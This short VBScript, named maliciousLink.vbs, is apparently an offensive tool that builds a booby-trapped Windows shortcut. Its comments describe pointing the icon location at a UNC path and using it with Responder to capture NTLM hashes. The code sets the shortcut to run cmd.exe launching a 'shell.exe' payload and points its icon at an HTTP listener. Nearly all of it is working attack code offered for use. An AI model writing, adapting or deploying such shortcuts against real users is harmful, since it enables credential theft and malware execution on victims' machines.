' Usage: cscript maliciousLink.vbs
' 
' Can point the IconLocation to UNC path
' and used in conjunction with Responder
' to grab bunches of NTLM hashes


Set oWS = WScript.CreateObject("WScript.Shell")
sLinkFile = "testing.LNK"
Set oLink = oWS.CreateShortcut(sLinkFile)
	oLink.TargetPath = "C:\Windows\System32\cmd.exe"
	oLink.Arguments = "/c c:\Users\james\Desktop\shell.exe"
    oLink.Description = "Testing testing"   
	oLink.IconLocation = "http://127.0.0.1:8555"
	oLink.WorkingDirectory = "C:\Windows\System32\"
oLink.Save
